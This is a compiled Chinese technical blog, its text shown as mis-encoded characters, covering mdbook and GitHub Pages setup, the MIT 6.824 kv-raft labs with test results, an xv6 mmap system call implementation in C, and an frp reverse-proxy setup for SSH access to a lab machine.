<p>åœ¨githubçš„ä»“åº“é¡µé¢é€‰æ‹©settingsï¼Œå°†pagesçš„build and deploymentçš„Sourceé€‰å›ä»åˆ†æ”¯å‘å¸ƒï¼ˆgh-pagesåˆ†æ”¯ï¼‰ã€‚æ³¨æ„åˆšæ‰åˆ›å»ºymlæ–‡ä»¶çš„æ—¶å€™è¦é€‰æ‹©Sourceä¸ºGitHub Actionsæ¥åˆ›å»ºã€‚å†è¿›è¡Œpushï¼Œå°±å¯ä»¥çœ‹åˆ°github actionè´Ÿè´£buildå’Œdeployåˆ°gh-pagesåˆ†æ”¯ï¼Œç„¶åå†ç”±github-pageså‘å¸ƒã€‚</p>
<h2 id="mdbookåšå®¢ç‰¹æ€§"><a class="header" href="#mdbookåšå®¢ç‰¹æ€§">mdbookåšå®¢ç‰¹æ€§</a></h2>
<p>è¿˜åœ¨æŒç»­æ¢ç´¢ä¹‹ä¸­...
å‘ç°urlæ˜¯åˆ›å»ºçš„mdæ–‡ä»¶çš„æ–‡ä»¶åï¼Œè€Œmdbookä¸­çš„ä¾§æ ç›®å½•æ˜¾ç¤ºçš„æ˜¯SUMMARY.mdä¸­çš„<code>[]</code>ä¸­çš„å†…å®¹ã€‚</p>
<h3 id="è¯•è¯•rust-playground"><a class="header" href="#è¯•è¯•rust-playground">è¯•è¯•rust playground</a></h3>
<p>å¯ä»¥è¿è¡Œä¸‹é¢çš„ä»£ç </p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>println!(&quot;Hello, World!&quot;);
<span class="boring">}
</span></code></pre></pre>
<h3 id="mathjaxæ”¯æŒ"><a class="header" href="#mathjaxæ”¯æŒ">MathJaxæ”¯æŒ</a></h3>
<p>\[ 
\sum_{k=0}^\infty \lfloor \frac{n}{5^k} \rfloor
\]</p>
<p>Latex Mathematical Symbols <a href="https://www.cmor-faculty.rice.edu/%7Eheinken/latex/symbols.pdf">reference</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="mit6824-kv-raft"><a class="header" href="#mit6824-kv-raft">MIT6.824 kv-raft</a></h1>
<p>ä½¿ç”¨lab2æ„å»ºçš„raftåº“ï¼Œæä¾›ä¸€ä¸ªfault-toleranceçš„key-valueæœåŠ¡</p>
<p>å®Œæ•´ä»£ç ï¼š<a href="https://gitee.com/sugarcoder/mit6.824.git">link</a></p>
<h2 id="lab3a"><a class="header" href="#lab3a">lab3A</a></h2>
<p>Clientè½®è¯¢å‘é€RPCè¯·æ±‚ï¼Œç›´åˆ°æ‰¾åˆ°æ˜¯leaderçš„serverã€‚</p>
<p>Serveræ¥å—Clientçš„è¯·æ±‚ï¼Œæ„é€ Opæ—¥å¿—ï¼Œäº¤ç»™raftèŠ‚ç‚¹ï¼ŒraftèŠ‚ç‚¹é›†ç¾¤ä¹‹é—´è¾¾æˆå…±è¯†åï¼Œæ¯ä¸ªraftèŠ‚ç‚¹é€šè¿‡applyChå‘Šè¯‰ç›¸åº”çš„serverï¼Œserverå°†æ—¥å¿—çš„å‘½ä»¤åº”ç”¨åˆ°çŠ¶æ€æœºä¸Šï¼Œleader serverå°†ç»“æœè¿”å›ç»™clientã€‚</p>
<h3 id="éš¾ç‚¹"><a class="header" href="#éš¾ç‚¹">éš¾ç‚¹</a></h3>
<p>å½“å­˜åœ¨å¤šä¸ªclientåŒæ—¶è¯·æ±‚çš„æ—¶å€™ï¼Œæœ‰å¤šä¸ªæ—¥å¿—è¢«æäº¤ï¼Œleaderå¦‚ä½•å®šä½çŠ¶æ€æœºçš„åº”ç”¨ç»“æœè¿”å›ç»™å“ªä¸ªclientï¼Ÿè§£å†³ï¼šç”¨æ¯ä¸ªå‘½ä»¤æäº¤æ—¶çš„log indexä½œä¸ºç´¢å¼•ï¼Œæ˜ å°„åˆ°ä¸€ä¸ªè¿”å›ç»“æœçš„é€šé“ï¼Œå¯¹äºapplyChè¿”å›æ¥çš„æ—¥å¿—ï¼Œæ ¹æ®æ—¥å¿—indexç¡®å®šè¦é€šçŸ¥çš„clientã€‚</p>
<p>å¦‚ä½•å®ç°çº¿æ€§åŒ–è¯­ä¹‰ï¼Ÿè§£å†³ï¼šç»™æ¯ä¸€ä¸ªè¯·æ±‚ä¸€ä¸ªUniqueIDï¼ˆIncreasingï¼‰ï¼Œserverä¿å­˜è®°å½•ç›®å‰å·²ç»è¢«åº”ç”¨åˆ°çŠ¶æ€æœºæœ€å¤§çš„è¯·æ±‚IDï¼Œé˜²æ­¢è¯·æ±‚è¢«å¤šæ¬¡åº”ç”¨ï¼ˆå†™è¯·æ±‚ï¼‰ã€‚å¯¹äºè¯»è¯·æ±‚ï¼Œæ€»è®©clientçœ‹åˆ°æœ€æ–°çš„çŠ¶æ€ã€‚clientå‘é€RPCè¯·æ±‚çš„æ—¶å€™ï¼Œé™„å¸¦clientIDå’ŒcommandIdï¼Œå…±åŒæ„æˆè¿™ä¸ªuniqueIDã€‚</p>
<h3 id="éœ€è¦æ³¨æ„çš„ç‚¹"><a class="header" href="#éœ€è¦æ³¨æ„çš„ç‚¹">éœ€è¦æ³¨æ„çš„ç‚¹</a></h3>
<p>å‘é€RPCçš„forå¾ªç¯ä¸­éœ€è¦ä½¿ç”¨ä¸€ä¸ªæ–°çš„replyç»“æ„ä½“ï¼Œä¼ é€’ç»™rpcï¼Œå¦åˆ™è¿˜æ˜¯ä¹‹å‰çš„replyç»“æœã€‚</p>
<p>serverä¸­ï¼Œåªæœ‰leaderéœ€è¦åœ¨RPCçš„ç­‰å¾…channelä¸Šå‘é€è¿”å›responseã€‚</p>
<h3 id="è¿è¡Œç»“æœ"><a class="header" href="#è¿è¡Œç»“æœ">è¿è¡Œç»“æœ</a></h3>
<pre><code class="language-shell">$ go test -run 3A                                          
Test: one client (3A) ...
  ... Passed --  15.7  5   396   74
Test: many clients (3A) ...
  ... Passed --  18.1  5   765  365
Test: unreliable net, many clients (3A) ...
  ... Passed --  24.0  5   959  179
Test: concurrent append to same key, unreliable (3A) ...
  ... Passed --   6.4  3   150   52
Test: progress in majority (3A) ...
  ... Passed --   1.5  5    53    2
Test: no progress in minority (3A) ...
  ... Passed --   1.6  5    77    3
Test: completion after heal (3A) ...
  ... Passed --   1.2  5    41    3
Test: partitions, one client (3A) ...
  ... Passed --  24.1  5   621   46
Test: partitions, many clients (3A) ...
  ... Passed --  25.5  5  1019  220
Test: restarts, one client (3A) ...
labgob warning: Decoding into a non-default variable/field int may not work
  ... Passed --  22.9  5  1096   70
Test: restarts, many clients (3A) ...
  ... Passed --  25.0  5  1733  375
Test: unreliable net, restarts, many clients (3A) ...
  ... Passed --  30.1  5  2015  151
Test: restarts, partitions, many clients (3A) ...
  ... Passed --  31.9  5  1534  159
Test: unreliable net, restarts, partitions, many clients (3A) ...
  ... Passed --  33.1  5  1775   97
Test: unreliable net, restarts, partitions, many clients, linearizability checks (3A) ...
  ... Passed --  32.7  7  4532  293
PASS
ok      _/Users/sjy/develop/Go/6.824/src/kvraft 296.354s
</code></pre>
<h2 id="lab3b-keyvalue-service-with-log-compaction"><a class="header" href="#lab3b-keyvalue-service-with-log-compaction">Lab3BÂ Key/value service with log compaction</a></h2>
<p>ä¸ºäº†é˜²æ­¢raftçš„logæ— é™åˆ¶å¢é•¿æµªè´¹ç©ºé—´ï¼Œkvserveréœ€è¦åœ¨é€‚å½“çš„æ—¶å€™å‘Šè¯‰raftè¿›è¡Œæ—¥å¿—å‹ç¼©ï¼Œå¹¶ä¸»åŠ¨ä¿å­˜çŠ¶æ€æœºçš„ç›¸å…³çŠ¶æ€ï¼Œä¿å­˜åˆ°persisterçš„snapshotä¸­ã€‚raftçš„leaderèŠ‚ç‚¹ä¹Ÿè¦æ£€æµ‹followerçš„logæ˜¯å¦è¿‡äºè¿‡æ—¶ï¼Œå¦‚æœfollowerå¯¹äºå›åº”AppendEntry RPCçš„å›å¤å‡ºç°è¯·æ±‚çš„æ—¥å¿—æ¡ç›®å·²ç»è¢«snapshotäº†ï¼Œleaderéœ€è¦å‘é€installSnapshot RPCï¼Œæ›´æ–°followerçš„Snapshotã€‚</p>
<p>ä¸ºäº†å®ç°åŠ¨æ€çš„æ—¥å¿—ï¼Œç»™Raftç»“æ„å¢åŠ ä¸€ä¸ªstartIndexï¼Œä»£è¡¨äº†æ—¥å¿—æ¡ç›®é€»è¾‘ä¸‹æ ‡çš„å¼€å§‹ä¸‹æ ‡ï¼Œä¹‹å‰ä¸€ç›´é»˜è®¤æ˜¯1ã€‚å½“è¿›è¡Œæ—¥å¿—å‹ç¼©åï¼ŒstartIndexå¢åŠ ï¼Œéœ€è¦ç»™Raftå®šä¹‰æ–°çš„æ—¥å¿—æ“ä½œæ¥å£ï¼Œæ¥å®Œæˆé€»è¾‘ä¸‹æ ‡åˆ°çœŸå®ä¸‹æ ‡çš„è½¬æ¢ã€‚startIndexä¹Ÿè¦ä½œä¸ºéœ€è¦persistçš„æŒä¹…çŠ¶æ€ï¼ˆå¦åˆ™å°±ä¸èƒ½é€šè¿‡TestSnapshotUnreliableRecoverConcurrentPartitionLinearizable3Bï¼‰ã€‚</p>
<p>å½“kvserverå’Œrafté‡å¯çš„æ—¶å€™ï¼Œéœ€è¦è¯»å–ç›¸å…³çš„stateæˆ–è€…snapshotï¼Œæ¥è·å¾—å´©æºƒä¹‹å‰çš„çŠ¶æ€ï¼ˆå¦‚çŠ¶æ€æœºç­‰ï¼‰ã€‚</p>
<p>å¯¹äºä¸æ˜¯leaderçš„kvserverï¼Œç›¸åº”çš„raftèŠ‚ç‚¹å¯èƒ½æ”¶åˆ°leaderçš„InstallSnapshot RPCï¼Œæ­¤æ—¶raftèŠ‚ç‚¹éœ€è¦é€šè¿‡applyChæ¥å‘Šè¯‰kvserveræ¥æ›´æ–°çŠ¶æ€æœºã€‚</p>
<h3 id="è¿è¡Œç»“æœ-1"><a class="header" href="#è¿è¡Œç»“æœ-1">è¿è¡Œç»“æœ</a></h3>
<pre><code class="language-shell">$ go test -run 3B
Test: InstallSnapshot RPC (3B) ...
  ... Passed --  18.8  3   409   63
Test: snapshot size is reasonable (3B) ...
--- FAIL: TestSnapshotSize3B (161.48s)
    config.go:65: test took longer than 120 seconds
Test: restarts, snapshots, one client (3B) ...
labgob warning: Decoding into a non-default variable/field int may not work
  ... Passed --  22.8  5  1111   74
Test: restarts, snapshots, many clients (3B) ...
  ... Passed --  35.2  5  4156 1480
Test: unreliable net, snapshots, many clients (3B) ...
  ... Passed --  23.6  5   933  189
Test: unreliable net, restarts, snapshots, many clients (3B) ...
  ... Passed --  27.0  5  1860  197
Test: unreliable net, restarts, partitions, snapshots, many clients (3B) ...
  ... Passed --  35.4  5  1807   89
Test: unreliable net, restarts, partitions, snapshots, many clients, linearizability checks (3B) ...
  ... Passed --  34.2  7  4541  258
FAIL
exit status 1
</code></pre>
<p>å‘ç°TestSnapshotSize3Bæ€»æ˜¯è¶…æ—¶ï¼Œè¦æ±‚åœ¨120så†…å®Œæˆï¼Œä½†æ˜¯æˆ‘çš„å®ç°æ€»æ˜¯160sã€‚ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯æˆ‘çš„raftå±‚æ²¡æœ‰å®ç°å¥½ï¼Œäºæ˜¯åˆå»å‚è€ƒäº†<a href="https://github.com/vtta/6.824">vtta</a>çš„raftè¿›è¡Œå®ç°ï¼Œè¿”ç°é€Ÿåº¦ä»ç„¶æ˜¯160sã€‚å°¬ä½äº†</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="mmap"><a class="header" href="#mmap">mmap</a></h1>
<p>å®ç°mmapç³»ç»Ÿè°ƒç”¨ï¼Œå°†æ–‡ä»¶å†…å®¹æ˜ å°„åˆ°è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œä¾¿äºå…±äº«å†…å­˜ã€‚</p>
<h2 id="é¢„å¤‡çŸ¥è¯†"><a class="header" href="#é¢„å¤‡çŸ¥è¯†">é¢„å¤‡çŸ¥è¯†</a></h2>
<pre><code class="language-c">void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
</code></pre>
<p>mmapç³»ç»Ÿè°ƒç”¨ï¼šå°†fdæŒ‡å‘çš„æ•°æ®ï¼ˆoffsetå¼€å§‹ï¼‰æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­çš„addråœ°å€å¼€å§‹çš„æœ€é•¿lengthçš„ä½ç½®ä¸Š æœ¬å®éªŒaddr = 0ï¼Œé‚£ä¹ˆéœ€è¦kernelæ¥é€‰æ‹©ç”¨äºæ˜ å°„æ–‡ä»¶çš„è™šæ‹Ÿå†…å­˜ä½ç½®ï¼Œmmapè¿”å›è¿™ä¸ªåœ°å€ prod æŒ‡å‡ºè¿™ä¸ªå†…å­˜æ˜¯å¦å¯è¯»å¯å†™å¯æ‰§è¡Œ flagsæŒ‡å‡ºè¿™ä¸ªå†…å­˜æ˜¯å¦éœ€è¦è¢«å†™å›ï¼ˆMAP_SHAREDï¼‰ï¼Œæˆ–è€…ä¸éœ€è¦è¢«å†™å›ï¼ˆMAP_PRIVATEï¼‰ offset åœ¨æœ¬å®éªŒä¸­ä¸º0</p>
<p>lazy load page: åœ¨ç¼ºé¡µtrapä¸­åˆ†é…ç‰©ç†é¡µï¼Œå‘é¡µè¡¨ä¸­åŠ å…¥è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†é¡µçš„æ˜ å°„</p>
<p>file inodeè®°å½•çš„æ˜¯è¯¥æ–‡ä»¶åœ¨ç£ç›˜ä¸Šçš„ä½ç½®ï¼ˆå—ï¼‰ï¼Œé€šè¿‡readiå°†inodeçš„å—è¯»åˆ°å†…å­˜ï¼Œreadiè°ƒç”¨either_copyoutå¤åˆ¶å—çš„å†…å®¹åˆ°å†…å­˜ either_copyoutå°†å†…æ ¸è¯»å–çš„å—å†…å®¹å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼Œåœ¨ç”¨æˆ·è¿›ç¨‹é¡µè¡¨ä¸­å¢åŠ ä¸€ä¸ªè™šæ‹Ÿåœ°å€åˆ°è¿™ä¸ªç‰©ç†åœ°å€çš„æ˜ å°„</p>
<h2 id="å®ç°æµç¨‹"><a class="header" href="#å®ç°æµç¨‹">å®ç°æµç¨‹</a></h2>
<p>åœ¨makefileä¸­åŠ å…¥mmaptest å¢åŠ ç³»ç»Ÿè°ƒç”¨mmap munmap</p>
<p>åœ¨proc.hä¸­å®šä¹‰VMAç»“æ„ä½“ï¼Œè®©æ¯ä¸ªè¿›ç¨‹ä¿å­˜è¢«æ˜ å°„çš„åœ°å€è®°å½•</p>
<pre><code class="language-c">struct vm_area_struct {
    int valid;
    uint64 addr;  // starting mapped virtual address
    uint64 length;  // mapped length
    int prot;    // permission
    int flags;   // whether to write back
    struct file *filep;      // the file structure
    int fd;
};

#define VMASIZE 16

// Per-process state
struct proc {
  struct spinlock lock;
  // ......

  // mapped files
  struct vm_area_struct VMA[VMASIZE];
  uint64 cur_max;   // the current max address for mapping
};
</code></pre>
<h3 id="éš¾ç‚¹å¦‚ä½•é€‰æ‹©åœ¨åœ°å€ç©ºé—´ä¸­çš„å“ªé‡Œå­˜å‚¨è¢«æ˜ å°„çš„å†…å­˜"><a class="header" href="#éš¾ç‚¹å¦‚ä½•é€‰æ‹©åœ¨åœ°å€ç©ºé—´ä¸­çš„å“ªé‡Œå­˜å‚¨è¢«æ˜ å°„çš„å†…å­˜">éš¾ç‚¹ï¼šå¦‚ä½•é€‰æ‹©åœ¨åœ°å€ç©ºé—´ä¸­çš„å“ªé‡Œå­˜å‚¨è¢«æ˜ å°„çš„å†…å­˜</a></h3>
<p>ç”¨æˆ·è¿›ç¨‹åœ°å€ç©ºé—´</p>
<pre><code class="language-txt">MAXVA -&gt;     -------------
             | trampoline |
             -------------
             | trapframe  |
             --------------
             |            |
max addr -&gt;  --------------
of mmap      |            |
             |            |
             |     heap   |
             |            |
             --------------
             | user stack |
             --------------
             | user text &amp; data
     0 -&gt;    --------------
</code></pre>
<p>æŸ¥çœ‹äº†ç½‘ä¸Šçš„å®ç°æ–¹æ³•ï¼Œéå¸¸ç®€å•å’Œå·§å¦™çš„åˆ©ç”¨äº†è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œåªæ˜¯å¤šå®šä¹‰äº†ä¸€ä¸ªcur_maxï¼Œè®°å½•å·²ç»è¢«åˆ†é…å‡ºå»çš„é¡¶ç«¯åœ°å€ï¼Œä¹‹åä¸æ–­ä¸‹ç§»è¿™ä¸ªcur_maxï¼Œç»§ç»­åˆ†é…å°±è¡Œäº†ã€‚åœ¨memlayout.hä¸­å®šä¹‰æœ€é«˜çš„å¯æ˜ å°„åœ°å€ä½ç½®ï¼Œæ‰€ä»¥åˆ†é…çš„è™šæ‹Ÿåœ°å€ä»è¿™é‡Œå¼€å§‹ï¼Œä¹‹åå‘ä¸‹ç”Ÿé•¿</p>
<pre><code class="language-c">#define MMAPMAXADDR (TRAPFRAME - 10 * PGSIZE)
</code></pre>
<p>åœ¨sysfile.cä¸­å®ç°mmap</p>
<pre><code class="language-c">uint64
sys_mmap(void)
{
    uint64 addr;
    int length, prot, flags, fd, offset;
    struct file *filep;
    if (argaddr(0, &amp;addr) &lt; 0 || argint(1, &amp;length) &lt; 0|| argint(2, &amp;prot) &lt; 0 || argint(3, &amp;flags) &lt; 0 || argfd(4, &amp;fd, &amp;filep)&lt;0 ||
            argint(5, &amp;offset) &lt; 0) {
        return ~0;
    }
    if (addr != 0) {
        printf(&quot;Only support the kernel assigned address.\n&quot;);
        return ~0;
    }
    // find empty VMA and the length bigger than required
    struct proc *pp = myproc();

    if (flags &amp; MAP_SHARED) {
        if (!(filep-&gt;writable) &amp;&amp; (prot &amp; PROT_WRITE)) {
            printf(&quot;The file is read only, but the mmap prot want to write the memory.\n&quot;);
            return ~0;
        }
    }

    uint64 curmax = pp-&gt;cur_max;
    uint64 start_addr = PGROUNDDOWN(curmax - length);

    struct vm_area_struct *pvma = 0;

    for (int i = 0; i &lt; VMASIZE; ++i) {
        if (pp-&gt;VMA[i].valid == 0) {
            pvma = &amp;pp-&gt;VMA[i];
            break;
        }
    }

    if (pvma) {
        pvma-&gt;valid = 1;
        pvma-&gt;addr = start_addr;
        pvma-&gt;length = length;
        pvma-&gt;prot = prot;
        pvma-&gt;flags = flags;
        pvma-&gt;fd = fd;
        pvma-&gt;filep = filep;
        filedup(pvma-&gt;filep); // increase reference count

        pp-&gt;cur_max = start_addr;
    } else {
        return ~0;
    }

    return start_addr;
}
</code></pre>
<p>åœ¨trap.cä¸­å®ç°lazy page allocation</p>
<pre><code class="language-c">int mmap_read(struct file *f, uint64 dst_va, int off, int size) {
    ilock(f-&gt;ip);
    int n = readi(f-&gt;ip, 1, dst_va, off, size);
    off += n;
    iunlock(f-&gt;ip);
    return off;
}

void
usertrap(void)
{
  int which_dev = 0;

  if((r_sstatus() &amp; SSTATUS_SPP) != 0)
    panic(&quot;usertrap: not from user mode&quot;);

  // send interrupts and exceptions to kerneltrap(),
  // since we're now in the kernel.
  w_stvec((uint64)kernelvec);

  struct proc *p = myproc();
  
  // save user program counter.
  p-&gt;trapframe-&gt;epc = r_sepc();
  
  if(r_scause() == 8){
    // system call

    if(p-&gt;killed)
      exit(-1);

    // sepc points to the ecall instruction,
    // but we want to return to the next instruction.
    p-&gt;trapframe-&gt;epc += 4;

    // an interrupt will change sstatus &amp;c registers,
    // so don't enable until done with those registers.
    intr_on();

    syscall();
  } else if((which_dev = devintr()) != 0){
      // ok
  } else if (r_scause() == 15 || r_scause() == 13) {  // Store/AMO page fault, load page fault
      uint64 va = r_stval();
      struct proc* pp = myproc();
      struct vm_area_struct *pvma = 0;
      for (int i = 0; i &lt; VMASIZE; ++i) {
          if (pp-&gt;VMA[i].valid == 1) {
              if (va &gt;= pp-&gt;VMA[i].addr &amp;&amp; va &lt; pp-&gt;VMA[i].addr + pp-&gt;VMA[i].length) {
                  pvma = &amp;pp-&gt;VMA[i];
                  break;
              }
          }
      }

      if (!pvma) {
          printf(&quot;The fault vm address not in the VMA.\n&quot;);
          goto err;
      }
      // if it is, allocate physical page(uvmalloc)
      char * pa = kalloc();
      if (pa == 0) {
          panic(&quot;kalloc in trap.c\n&quot;);
      }
      memset(pa, 0, PGSIZE);

      uint64 fault_page_start = PGROUNDDOWN(va);
      if (mappages(pp-&gt;pagetable, fault_page_start, PGSIZE, (uint64)pa, (pvma-&gt;prot &lt;&lt; 1) | PTE_U ) != 0) {
          kfree(pa);
          goto err;
      }
      // write the file content to the mapped page
      int offset = fault_page_start - pvma-&gt;addr; // the offset in the file
      mmap_read(pvma-&gt;filep, fault_page_start, offset, PGSIZE);
  } else {
err:
    printf(&quot;usertrap(): unexpected scause %p pid=%d\n&quot;, r_scause(), p-&gt;pid);
    printf(&quot;            sepc=%p stval=%p\n&quot;, r_sepc(), r_stval());
    p-&gt;killed = 1;
  }

  if(p-&gt;killed)
    exit(-1);

  // give up the CPU if this is a timer interrupt.
  if(which_dev == 2)
    yield();

  usertrapret();
}
</code></pre>
<p>å®ç°unmapã€‚ åœ¨å¤„ç†unmapçš„regionçš„æ—¶å€™ï¼Œé¢˜ç›®ç»™äº†ç®€åŒ–çš„å‡è®¾ï¼š An munmap call might cover only a portion of an mmap-ed region, but you can assume that it will either unmap at the start, or at the end, or the whole region (but not punch a hole in the middle of a region).</p>
<pre><code class="language-c">uint64
sys_munmap(void)
{
    uint64 addr;
    int length;
    if (argaddr(0, &amp;addr) &lt; 0 || argint(1, &amp;length) &lt; 0) {
        return -1;
    }
    if (addr % PGSIZE || length &lt; 0) {
        return -1;
    }
    // find the vma include the addr
    uint64 start_addr = PGROUNDDOWN(addr);
    uint64 end_addr = PGROUNDDOWN(addr + length);

//    printf(&quot;The start addr(%p), end add (%p)\n&quot;, start_addr, end_addr);
    struct vm_area_struct *pvma = 0;
    struct proc *pp = myproc();

    for (int i = 0; i &lt; VMASIZE; ++i) {
        if (pp-&gt;VMA[i].valid == 1 &amp;&amp;
                pp-&gt;VMA[i].addr &lt;= start_addr &amp;&amp;
                end_addr &lt;= pp-&gt;VMA[i].addr + pp-&gt;VMA[i].length) {
            pvma = &amp;pp-&gt;VMA[i];
            break;
        }
    }

    if (!pvma) {
        printf(&quot;Cannot find VMA, start from (%p) to (%p).\n&quot;, start_addr, end_addr);
        return -1;
    }

    // write back if flags is MAP_SHARED
    if ((pvma-&gt;flags &amp; MAP_SHARED) &amp;&amp; pvma-&gt;filep-&gt;writable) {
        struct file *f =pvma-&gt;filep;
        begin_op();
        ilock(f-&gt;ip);
        // todo: only write the dirty page
        writei(f-&gt;ip, 1, pvma-&gt;addr, 0, pvma-&gt;length);
        iunlock(f-&gt;ip);
        end_op();
    }

    // unmap the page from rounddown(addr) ~ roundup(addr + length)
    pte_t *pte;
    for (uint64 va = start_addr; va &lt; end_addr; va += PGSIZE) {  // æ³¨æ„ç±»å‹ï¼ï¼
//        printf(&quot;Unmap the address :%p\n&quot;, va);
        if ((pte = walk(pp-&gt;pagetable, va, 0)) != 0) {
            if (*pte &amp; PTE_V) {
                uvmunmap(pp-&gt;pagetable, va, 1, 1);
            }
        }
    }

    // if the whole vma is unmapped, decrease refcount
    if (start_addr == pvma-&gt;addr &amp;&amp; end_addr &lt; pvma-&gt;addr + pvma-&gt;length) {
        pvma-&gt;addr = end_addr;
        pvma-&gt;length -= length;
    } else if (start_addr &gt; pvma-&gt;addr &amp;&amp; end_addr == pvma-&gt;addr + pvma-&gt;length) {
        pvma-&gt;length -= length;
    } else if (start_addr == pvma-&gt;addr &amp;&amp; end_addr == pvma-&gt;addr + pvma-&gt;length) {
        // unmap the whole VMA
        pvma-&gt;valid = 0;
        pvma-&gt;filep-&gt;ref--;
        pvma-&gt;length = 0;
    } else {
        printf(&quot;You punch a whole in the vma. not supported.\n&quot;);
        return -1;
    }

    return 0;
}
</code></pre>
<p>åœ¨exitä¸­unmapæ‰€æœ‰VMA</p>
<pre><code class="language-c">void
exit(int status)
{
  struct proc *p = myproc();

  if(p == initproc)
    panic(&quot;init exiting&quot;);

  // Close all open files.
  for(int fd = 0; fd &lt; NOFILE; fd++){
    if(p-&gt;ofile[fd]){
      struct file *f = p-&gt;ofile[fd];
      fileclose(f);
      p-&gt;ofile[fd] = 0;
    }
  }

  // unmap all mapped region
    struct vm_area_struct *vm = 0;
    for (int i = 0; i &lt; VMASIZE; ++i) {
        if (p-&gt;VMA[i].valid) {
            vm = &amp;p-&gt;VMA[i];

            // write back if flags is MAP_SHARED
            if ((vm-&gt;flags &amp; MAP_SHARED) &amp;&amp; vm-&gt;filep-&gt;writable) {
                struct file *f =vm-&gt;filep;
                begin_op();
                ilock(f-&gt;ip);
                // todo: only write the dirty page
                writei(f-&gt;ip, 1, vm-&gt;addr, 0, vm-&gt;length);
                iunlock(f-&gt;ip);
                end_op();
            }

            vm-&gt;valid = 0;
            pte_t *pte;
            for (uint64 j = vm-&gt;addr; j &lt; vm-&gt;addr + vm-&gt;length; j += PGSIZE) {
                if((pte = walk(p-&gt;pagetable, j, 0)) != 0) {
                    if(*pte &amp; PTE_V) {
                        uvmunmap(p-&gt;pagetable, j, 1, 1);
                    }
                }
            }
        }
    }
....
}
</code></pre>
<p>å®ç°forkä¸­å¤åˆ¶VMAç»™å­è¿›ç¨‹</p>
<pre><code class="language-c">int
fork(void)
{
  int i, pid;
  struct proc *np;
  struct proc *p = myproc();

  // .....
    // copy all VMA from parent to children
    for (int i = 0; i &lt; VMASIZE; ++i) {
        if (p-&gt;VMA[i].valid) {
            np-&gt;VMA[i] = p-&gt;VMA[i];
            filedup(p-&gt;VMA[i].filep);
        }
    }

  safestrcpy(np-&gt;name, p-&gt;name, sizeof(p-&gt;name));

  pid = np-&gt;pid;

  release(&amp;np-&gt;lock);

  acquire(&amp;wait_lock);
  np-&gt;parent = p;
  release(&amp;wait_lock);

  acquire(&amp;np-&gt;lock);
  np-&gt;state = RUNNABLE;
  release(&amp;np-&gt;lock);

  return pid;
}
</code></pre>
<p>è¦æ³¨æ„çš„ç‚¹ï¼šaddressçš„ç±»å‹æ—¶uint64ï¼Œåœ¨å†™å¾ªç¯å˜é‡çš„æ—¶å€™ä¸è¦å†™é”™äº†ï¼›å¯¹äºMAP_SHAREç±»å‹çš„VMAï¼Œåœ¨å†™å›æ—¶æ³¨æ„æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯å†™ã€‚</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="frpå†…ç½‘ç©¿é€å®è·µ"><a class="header" href="#frpå†…ç½‘ç©¿é€å®è·µ">frpå†…ç½‘ç©¿é€å®è·µ</a></h1>
<blockquote>
<p>frp æ˜¯ä¸€ä¸ªä¸“æ³¨äºå†…ç½‘ç©¿é€çš„é«˜æ€§èƒ½çš„åå‘ä»£ç†åº”ç”¨ï¼Œæ”¯æŒ TCPã€UDPã€HTTPã€HTTPS ç­‰å¤šç§åè®®ã€‚å¯ä»¥å°†å†…ç½‘æœåŠ¡ä»¥å®‰å…¨ã€ä¾¿æ·çš„æ–¹å¼é€šè¿‡å…·æœ‰å…¬ç½‘ IP èŠ‚ç‚¹çš„ä¸­è½¬æš´éœ²åˆ°å…¬ç½‘ã€‚â€</p>
</blockquote>
<p>å®éªŒå®¤æœ‰å°ç”µè„‘Ubuntuï¼ˆæ— å…¬ç½‘ipï¼‰ï¼Œæƒ³ç”¨è‡ªå·±çš„ç”µè„‘Macä½¿ç”¨å‘½ä»¤è¡Œè®¿é—®ï¼Œå°±ä¸éœ€è¦ç”¨teamviewerè¿™ç±»æ¡Œé¢é•œåƒæ¥è¿œç¨‹æ§åˆ¶äº†ã€‚æˆ‘è‡ªå·±åˆæœ‰ä¸€å°è¿™ä¸ªé˜¿é‡Œäº‘çš„æœåŠ¡å™¨ï¼ˆå¸¦æœ‰å…¬ç½‘ipçš„ï¼‰ï¼Œå°±æƒ³ç€ç”¨å®ƒæ¥åšä¸­ç»§å®Œæˆå†…ç½‘ç©¿é€ã€‚</p>
<h2 id="æ­¥éª¤"><a class="header" href="#æ­¥éª¤">æ­¥éª¤</a></h2>
<p>ä¸‹è½½<a href="https://github.com/fatedier/frp/releases">frp</a>ï¼Œè§£å‹åæŠŠfrps å’Œ frps.init æ”¾åˆ°é˜¿é‡Œäº‘æœåŠ¡å™¨Aä¸Šï¼ŒæŠŠ frpc å’Œ frpc.init æ”¾åˆ° ubuntuä¸Šã€‚</p>
<p>ç¼–å†™frps.inité…ç½®æ–‡ä»¶ï¼ŒæŒ‰ç…§frpé¡¹ç›®çš„readmeï¼Œåªéœ€è¦é…ç½®ç«¯å£å³å¯ã€‚</p>
<pre><code>[common]bind_port = 7000        #frpæœåŠ¡ç«¯ç«¯å£
</code></pre>
<p>ç¼–å†™frpc.init</p>
<pre><code>[common]
    server_addr = xxx.xxx.xxx.xxx
    server_port = 7000
    tls_enable = true
[ssh]
    type = tcp
    local_ip = 127.0.0.1
    local_port = 22
    remote_port = 6000
</code></pre>
<p>ç”±äºæ˜¯é˜¿é‡Œäº‘çš„æœåŠ¡å™¨ï¼Œéœ€è¦åœ¨é˜¿é‡Œäº‘çš„æ§åˆ¶å°ä¸Šæ‰“å¼€æœåŠ¡å™¨çš„ç«¯å£ï¼Œ7000ç«¯å£ç”¨äºfrpcè®¿é—®frpsï¼Œ6000ç«¯å£ç”¨äºæœ¬æœºMacè®¿é—®æœåŠ¡å™¨ã€‚ç™»é™†æœåŠ¡å™¨ï¼Œæ‰“å¼€å¯¹åº”çš„é˜²ç«å¢™ã€‚</p>
<pre><code class="language-shell">sugar@Server:~/frp$ sudo ufw allow 6000
sugar@Server:~/frp$ sudo ufw allow 7000
</code></pre>
